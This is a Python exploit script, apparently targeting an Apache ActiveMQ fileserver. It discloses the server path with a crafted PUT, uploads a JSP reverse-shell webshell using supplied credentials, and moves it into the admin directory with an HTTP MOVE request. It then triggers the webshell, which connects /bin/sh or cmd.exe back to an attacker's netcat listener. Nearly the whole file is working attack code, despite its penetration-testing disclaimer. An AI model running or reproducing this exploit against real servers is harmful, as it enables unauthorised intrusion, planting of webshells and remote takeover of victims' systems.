#!/usr/bin/env python
# encoding: utf-8

import pdb;
import requests
from requests import Request, Session
import sys
from base64 import b64encode

print("Developed by @cyberaguiar - www.cyberaguiar.com\n\
-----------------------------------------------------------------------\n\
** Disclaimer **\n\
-----------------------------------------------------------------------\n\
The developer of this script are not responsible for any misuse of this\n\
exploit we only encourage the ethical use of this script and to be used\n\
only when authorised to do so during an penetration test or similar. Any\n\
damages or misuse of this script is the responsibility of the individuals\n\
who use them unethically or with the intent to damage property.\n\
-----------------------------------------------------------------------\n")

if len(sys.argv) != 7:
    print("USAGE: python %s rhost rport username password lhost lport" % (sys.argv[0]))
    sys.exit(-1)

rhost = sys.argv[1]
rport = sys.argv[2]
username = sys.argv[3]
password = sys.argv[4]
lhost = sys.argv[5]
lport = sys.argv[6]

ok = input("""Open other terminal window, execute command below and hit enter to continue:
nc -nvlp {lport}""".format(lport=lport))

payload1 = """<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream af;
    OutputStream uq;

    StreamConnector( InputStream af, OutputStream uq )
    {
      this.af = af;
      this.uq = uq;
    }

    public void run()
    {
      BufferedReader ft  = null;
      BufferedWriter mot = null;
      try
      {
        ft  = new BufferedReader( new InputStreamReader( this.af ) );
        mot = new BufferedWriter( new OutputStreamWriter( this.uq ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = ft.read( buffer, 0, buffer.length ) ) > 0 )
        {
          mot.write( buffer, 0, length );
          mot.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( ft != null )
          ft.close();
        if( mot != null )
          mot.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}
"""

payload2 = """
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
"""

payload = """
{payload1}
    Socket socket = new Socket( "{lhost}", {lport} );
{payload2}
""".format(payload1=payload1, payload2=payload2, lhost=lhost, lport=lport)

auth = b64encode("{}:{}".format(username, password).encode()).decode()

print("Bursting the absolute path")
response = requests.put(
    'http://{}:{}/fileserver/test/%20/%20'.format(
        rhost, rport),
        data="test")

rhost_path = response.reason.split()[0].replace("/fileserver/test/", "")
print("Absolute path is: {}".format(rhost_path))

print("Sending payload to http://{}/fileserver/webshell.jsp".format(rhost))
response = requests.put(
    'http://{}:{}/fileserver/webshell.jsp'.format(
        rhost, rport),
        data=payload,
        headers={'Authorization': 'Basic {}'.format(auth)})


print("Moving payload to {}/admin/webshell.jsp".format(rhost_path))
s = Session()
req = Request('MOVE',
	'http://{}:{}/fileserver/webshell.jsp'.format(
        rhost, rport),
        headers={
	   'Authorization': 'Basic {}'.format(auth),
           "Destination": "file://{}/admin/webshell.jsp".format(rhost_path)
        })

prepped = s.prepare_request(req)
resp = s.send(prepped)

response = requests.get(
    'http://{}:{}/admin/webshell.jsp'.format(
        rhost, rport),
        headers={'Authorization': 'Basic {}'.format(auth)})

print("Payload installed at http://{}:{}/admin/webshell.jsp".format(rhost, rport))
